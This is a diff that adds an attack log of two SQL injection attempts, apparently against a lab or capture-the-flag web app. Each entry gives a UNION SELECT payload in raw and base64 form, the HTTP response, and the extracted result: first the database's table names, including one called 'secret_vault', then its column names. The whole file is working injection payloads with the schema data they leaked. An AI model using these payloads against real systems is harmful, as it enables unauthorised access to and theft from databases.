@@ -1,0 +1,10 @@
+RAW  : "' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()-- -"
+B64  : JyBVTklPTiBTRUxFQ1QgR1JPVVBfQ09OQ0FUKHRhYmxlX25hbWUpIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBXSEVSRSB0YWJsZV9zY2hlbWE9ZGF0YWJhc2UoKS0tIC0=
+HTTP : 200 LEN=4131
+DET  : art='🖼️' h2='&#039; UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()-- -' desc='animals,secret_vault<br>'
+------------------------------------------------------------------------
+RAW  : "' UNION SELECT GROUP_CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema=database()-- -"
+B64  : JyBVTklPTiBTRUxFQ1QgR1JPVVBfQ09OQ0FUKHRhYmxlX25hbWUsJzonLGNvbHVtbl9uYW1lKSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIFdIRVJFIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpLS0gLQ==
+HTTP : 200 LEN=4215
+DET  : art='🖼️' h2='&#039; UNION SELECT GROUP_CONCAT(table_name,&#039;:&#039;,column_name) FROM information_schema.columns WHERE table_schema=database()-- -' desc='animals:description,animals:id,animals:name,secret_vault:id,secret_vault:note<br>'
+------------------------------------------------------------------------
